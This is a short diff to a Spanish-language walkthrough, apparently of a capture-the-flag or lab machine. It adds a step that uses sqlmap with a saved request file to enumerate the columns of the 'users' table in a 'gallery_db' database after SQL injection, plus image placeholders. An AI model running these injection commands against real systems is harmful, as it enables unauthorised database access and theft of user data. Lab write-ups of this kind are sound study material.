@@ -63,3 +63,11 @@ sqlmap -r phpid.txt -D gallery_db --tables
 ```
 hemos enumerado las tablas de la base de datos. la tabla de users parece interesanta asi que vamos a echar un vistazo 
 ![[Pasted image 20240112223302.png]]
+
+ahora vamos a enumerar la tabla de usuarios 
+
+```python
+sqlmap -r phpid.txt -D gallery_db -T users --columns users
+```
+
+![[Pasted image 20240112223801.png]]
